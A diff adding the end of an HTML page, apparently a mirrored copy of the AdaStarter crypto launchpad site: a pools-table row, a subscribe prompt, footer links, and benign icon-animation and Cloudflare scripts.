+  <td class="table__ratio table-row">
+  <span data-target="pool-partial.accessType">
+  </span></td>
+  <td class="table__progress table-row">
+  <div class="table__percentage"><span data-target="pool-partial.progressPercentage">0%</span></div>
+  <div class="progress">
+  <div class="progress-bar" role="progressbar" style="width: 0%" aria-valuemin="0" aria-valuemax="100" data-target="pool-partial.progressBar"></div>
+  </div>
+  </td>
+  <td class="table-row">
+  <div class="label" data-target="pool-partial.statusProcessing">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><title>ripples</title><g class="nc-icon-wrapper" fill="#727480"><g class="nc-loop_ripples-16"> <circle fill="#727480" cx="8" cy="8" r="8" transform="translate(1.6402999999999475 1.6402999999999475) scale(0.7949625000000066)" style="opacity:0.9899250000000132;"></circle> </g> <script>!function(){function t(t){this.element=t,this.circle=this.element.getElementsByTagName("circle")[0],this.animationId,this.start=null,this.init()}if(!window.requestAnimationFrame){var i=null;window.requestAnimationFrame=function(t,n){var e=(new Date).getTime();i||(i=e);var a=Math.max(0,16-(e-i)),r=window.setTimeout(function(){t(e+a)},a);return i=e+a,r}}t.prototype.init=function(){var t=this;this.animationId=window.requestAnimationFrame(t.triggerAnimation.bind(t))},t.prototype.reset=function(){var t=this;window.cancelAnimationFrame(t.animationId)},t.prototype.triggerAnimation=function(t){var i=this;this.start||(this.start=t);var n=t-this.start,e=Math.min(n/800,1);800&gt;n||(this.start=this.start+800);var a=.3+5*e/7;if(.3+e&gt;1)(a=.8+2*(e-.7)/3);var r=8*(1-(a=Math.min(a,1))),o=8*(1-a),s=10*e/7;if(.3+e&gt;1)(s=Math.max(1-10/3*(e-.7),0));this.circle.setAttribute("transform","translate("+r+" "+o+") scale("+a+")"),this.circle.setAttribute("style","opacity:"+s+";");if(document.documentElement.contains(this.element))window.requestAnimationFrame(i.triggerAnimation.bind(i))};var n=document.getElementsByClassName("nc-loop_ripples-16"),e=[];if(n)for(var a=0;n.length&gt;a;a++)!function(i){e.push(new t(n[i]))}(a);document.addEventListener("visibilitychange",function(){"hidden"==document.visibilityState?e.forEach(function(t){t.reset()}):e.forEach(function(t){t.init()})})}(); </script></g></svg>
+  </div>
+  <div class="label d-none" data-target="pool-partial.statusBadge">
+  <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 8 8" fill="none">
+  <circle cx="4" cy="4" r="4" fill="#212121"></circle>
+  </svg>
+  <span data-target="pool-partial.statusLabel">Live</span>
+  </div>
+  </td>
+  </tr><tr id="lithium-1" data-action="click->pool-partial#redirect" data-controller="pool-partial" data-layout="pools-index" data-pool-contract="0xE9ba24d20A866668f655B412E0B3a7F907C2704a" data-pool-name="Lithium 1" data-pool-position="244" data-pool-token-symbol="LITH" data-guid="lithium-1">
+  <th class="table__number table-row d-none" scope="row"><span data-target="pool-partial.position"></span></th>
+  <td class="table__pool-name table-row">
+  
+  <div class="table__pool-info">
+  <div data-target="pool-partial.name"></div>
+  <span data-target="pool-partial.pair" class="d-none">
+  </span>
+  </div>
+  </td>
+  <td class="table__ratio table-row">
+  <span data-target="pool-partial.price">
+  </span></td>
+  <td class="table__ratio table-row">
+  <span data-target="pool-partial.accessType">
+  </span></td>
+  <td class="table__progress table-row">
+  <div class="table__percentage"><span data-target="pool-partial.progressPercentage">0%</span></div>
+  <div class="progress">
+  <div class="progress-bar" role="progressbar" style="width: 0%" aria-valuemin="0" aria-valuemax="100" data-target="pool-partial.progressBar"></div>
+  </div>
+  </td>
+  <td class="table-row">
+  <div class="label" data-target="pool-partial.statusProcessing">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><title>ripples</title><g class="nc-icon-wrapper" fill="#727480"><g class="nc-loop_ripples-16"> <circle fill="#727480" cx="8" cy="8" r="8" transform="translate(1.6402999999999475 1.6402999999999475) scale(0.7949625000000066)" style="opacity:0.9899250000000132;"></circle> </g> <script>!function(){function t(t){this.element=t,this.circle=this.element.getElementsByTagName("circle")[0],this.animationId,this.start=null,this.init()}if(!window.requestAnimationFrame){var i=null;window.requestAnimationFrame=function(t,n){var e=(new Date).getTime();i||(i=e);var a=Math.max(0,16-(e-i)),r=window.setTimeout(function(){t(e+a)},a);return i=e+a,r}}t.prototype.init=function(){var t=this;this.animationId=window.requestAnimationFrame(t.triggerAnimation.bind(t))},t.prototype.reset=function(){var t=this;window.cancelAnimationFrame(t.animationId)},t.prototype.triggerAnimation=function(t){var i=this;this.start||(this.start=t);var n=t-this.start,e=Math.min(n/800,1);800&gt;n||(this.start=this.start+800);var a=.3+5*e/7;if(.3+e&gt;1)(a=.8+2*(e-.7)/3);var r=8*(1-(a=Math.min(a,1))),o=8*(1-a),s=10*e/7;if(.3+e&gt;1)(s=Math.max(1-10/3*(e-.7),0));this.circle.setAttribute("transform","translate("+r+" "+o+") scale("+a+")"),this.circle.setAttribute("style","opacity:"+s+";");if(document.documentElement.contains(this.element))window.requestAnimationFrame(i.triggerAnimation.bind(i))};var n=document.getElementsByClassName("nc-loop_ripples-16"),e=[];if(n)for(var a=0;n.length&gt;a;a++)!function(i){e.push(new t(n[i]))}(a);document.addEventListener("visibilitychange",function(){"hidden"==document.visibilityState?e.forEach(function(t){t.reset()}):e.forEach(function(t){t.init()})})}(); </script></g></svg>
+  </div>
+  <div class="label d-none" data-target="pool-partial.statusBadge">
+  <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" viewBox="0 0 8 8" fill="none">
+  <circle cx="4" cy="4" r="4" fill="#212121"></circle>
+  </svg>
+  <span data-target="pool-partial.statusLabel">Live</span>
+  </div>
+  </td>
+  </tr>
+  </tbody>
+  </table>
+  <nav></nav>
+  </div>
+  <div data-controller="subscribe-modal" class="container ">
+  <div class="subscribe">
+  <div class="subscribe__content">
+  <h2>Get Alerts For New Pools</h2>
+  <h3>Subscribe to get notified about new pools and other relevant events.</h3>
+  <button class="button button--secondary subscribeModalButton2" data-action="click->subscribe-modal#openModal">Subscribe</button>
+  </div>
+  <div class="subscribe__illustration"></div>
+  </div>
+  </div>
+  </div>
+  <footer class="footer ">
+  <div class="container">
+  <div class="footer__grid">
+  <div>
+  <div class="footer__logo">
+  <a style="text-decoration: none;" href="index.html">
+  
+  </a> </div>
+  <div class="copyright">
+  © AdaStarter 2021
+  </div>
+  </div>
+  <div>
+  <div class="footer__title">Social</div>
+  <a href="https://blog.adastarter.com/" class="footer__link" target="_blank">Blog</a>
+  <a href="https://t.me/adastarter" class="footer__link" target="_blank">Telegram</a>
+  <a href="https://twitter.com/adastarter" class="footer__link" target="_blank">Twitter</a>
+  <a href="#" class="footer__link" target="_blank">Discord</a>
+  </div>
+  <div>
+  <div class="footer__title">Company</div>
+  <a target="_blank" class="footer__link" href="https://careers.adastarter.com/">Careers</a>
+  <a class="footer__link" href="about.html">About us</a>
+  <a class="footer__link" href="council.html">Council</a>
+  <a class="footer__link" target="_blank" href="https://governance.adastarter.com/">Apply for IDO</a>
+  </div>
+  <div>
+  <div class="footer__title">Help</div>
+  <a href="https://support.adastarter.com/" class="footer__link" target="_blank">Support</a>
+  <a class="footer__link" href="terms.html">Terms</a>
+  <a class="footer__link" href="privacy.html">Privacy</a>
+  <a class="footer__link" href="press.html">Press Kit</a>
+  </div>
+  <div>
+  <div class="footer__title">Developers</div>
+  <a href="https://docs.cardano.org/" class="footer__link" target="_blank">Documentation</a>
+  <a href="https://www.npmjs.com/package/cardano-js" class="footer__link" target="_blank">Cardano.js</a>
+  </div>
+  </div>
+  <div class="footer__theme">
+  <div class="footer__theme-switch" data-controller="dark-mode">
+  <button class="footer__theme-switch--left" data-action="click->dark-mode#switchDarkMode" data-theme="dark">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M20 17.7534C20.2785 17.7255 20.5448 17.8746 20.6666 18.1267C20.7775 18.3623 20.7411 18.6409 20.5733 18.8401C18.6926 20.8983 16.028 22.0635 13.24 22.0467C7.67294 22.0467 3.15997 17.5338 3.15997 11.9667C3.15997 6.3997 7.67294 1.88673 13.24 1.88673C14.3763 1.88534 15.5042 2.0816 16.5733 2.46673C16.8331 2.55738 17.0106 2.79836 17.02 3.07339C17.0424 3.36006 16.8784 3.62879 16.6133 3.74006C13.499 5.14733 11.7697 8.51921 12.4439 11.8695C13.1181 15.2198 16.0171 17.6603 19.4333 17.7534H20ZM4.5133 12.0001C4.5133 16.8307 8.42931 20.7467 13.26 20.7467C15.1151 20.7569 16.9226 20.1598 18.4066 19.0467C14.8701 18.5692 11.9878 15.9728 11.1449 12.5052C10.3019 9.03757 11.6706 5.40774 14.5933 3.36006C14.1527 3.28675 13.7066 3.25106 13.26 3.25339C8.42931 3.25339 4.5133 7.16941 4.5133 12.0001Z" fill="#171A23"></path>
+  </svg>
+  </button>
+  <button class="footer__theme-switch--right" data-action="click->dark-mode#switchDarkMode" data-theme="light">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M12 4.20675C12.3682 4.20675 12.6667 3.90827 12.6667 3.54008V1.27342C12.6667 0.905227 12.3682 0.60675 12 0.60675C11.6318 0.60675 11.3333 0.905227 11.3333 1.27342V3.54008C11.3333 3.90827 11.6318 4.20675 12 4.20675ZM5.78597 9.27507C6.85862 6.75451 9.34761 5.13159 12.0867 5.16675C15.7902 5.19609 18.7718 8.21647 18.7534 11.9201C18.7531 14.6594 17.0982 17.1272 14.564 18.1672C12.0298 19.2072 9.11839 18.6134 7.19396 16.6639C5.26952 14.7145 4.71333 11.7956 5.78597 9.27507ZM7.01727 14.0468C7.88317 16.0699 9.88637 17.3686 12.0867 17.3334C15.0513 17.3041 17.4349 14.8847 17.42 11.9201C17.4225 9.71946 16.0941 7.73581 14.0583 6.90012C12.0225 6.06443 9.68355 6.54261 8.13911 8.11022C6.59466 9.67783 6.15136 12.0237 7.01727 14.0468ZM11.3333 20.4601C11.3333 20.0919 11.6318 19.7934 12 19.7934C12.3682 19.7934 12.6667 20.0919 12.6667 20.4601V22.7267C12.6667 23.0949 12.3682 23.3934 12 23.3934C11.6318 23.3934 11.3333 23.0949 11.3333 22.7267V20.4601ZM5.54669 6.49342C5.67066 6.6061 5.8325 6.66799 6.00003 6.66675C6.17723 6.66778 6.34755 6.59821 6.47336 6.47342C6.59957 6.34824 6.67056 6.17784 6.67056 6.00009C6.67056 5.82233 6.59957 5.65193 6.47336 5.52675L4.88669 3.94675C4.62219 3.72024 4.2279 3.73547 3.98165 3.98171C3.7354 4.22796 3.72017 4.62225 3.94669 4.88675L5.54669 6.49342ZM17.8068 17.3335C18.0378 17.2716 18.2842 17.3376 18.4534 17.5068L20.0534 19.1134C20.3118 19.3734 20.3118 19.7934 20.0534 20.0534C19.9303 20.179 19.7625 20.2509 19.5867 20.2534C19.4085 20.2527 19.2381 20.1807 19.1133 20.0534L17.5067 18.4534C17.3376 18.2843 17.2715 18.0378 17.3334 17.8068C17.3953 17.5758 17.5758 17.3954 17.8068 17.3335ZM4.20669 12.0001C4.20669 11.6319 3.90821 11.3334 3.54002 11.3334H1.27336C0.905166 11.3334 0.606689 11.6319 0.606689 12.0001C0.606689 12.3683 0.905166 12.6668 1.27336 12.6668H3.54002C3.90821 12.6668 4.20669 12.3683 4.20669 12.0001ZM20.46 11.3334H22.7267C23.0949 11.3334 23.3933 11.6319 23.3933 12.0001C23.3933 12.3683 23.0949 12.6668 22.7267 12.6668H20.46C20.0918 12.6668 19.7933 12.3683 19.7933 12.0001C19.7933 11.6319 20.0918 11.3334 20.46 11.3334ZM5.54671 17.5067L3.94671 19.1134C3.75527 19.3033 3.69705 19.5898 3.79919 19.8393C3.90134 20.0889 4.14374 20.2523 4.41337 20.2534C4.59154 20.2527 4.76199 20.1807 4.88671 20.0534L6.49337 18.4534C6.75479 18.192 6.75479 17.7682 6.49337 17.5067C6.23196 17.2453 5.80812 17.2453 5.54671 17.5067ZM18.4733 6.47342C18.3475 6.59821 18.1772 6.66777 18 6.66675C17.8228 6.66777 17.6525 6.59821 17.5267 6.47342C17.4005 6.34824 17.3295 6.17784 17.3295 6.00008C17.3295 5.82232 17.4005 5.65193 17.5267 5.52675L19.1333 3.92675C19.3934 3.66827 19.8133 3.66827 20.0733 3.92675C20.3318 4.18677 20.3318 4.60672 20.0733 4.86675L18.4733 6.47342Z" fill="white"></path>
+  </svg>
+  </button>
+  </div>
+  </div>
+  </div>
+  </footer>
+  
+  <script src="../cdn.jsdelivr.net/npm/jdenticon%403.1.0/dist/jdenticon.min.js" async="" integrity="sha384-VngWWnG9GS4jDgsGEUNaoRQtfBGiIKZTiXwm9KpgAeaRn6Y/1tAFiyXqSzqC8Ga/" crossorigin="anonymous"></script>
+  <script type="text/javascript">(function(){window['__CF$cv$params']={r:'68447b130abed593',m:'331fd7b377596e29dbcff1e7020378d3753e7260-1629890947-1800-ASkp94gZJujPMUsonMaKZ6jVtSOe5rxzMpnjymqMo6jKolGPBSl0Vle6ijcACBtbCxQVfkSoTPYeWuKCGSFYFUDZj4M7Q+geOScCkgfsQe9e8gIHWmqBd68MVuEFpeC6UQ==',s:[0x92106017b2,0xc2242dda06],}})();</script>
+  
+  
+  </body></html>
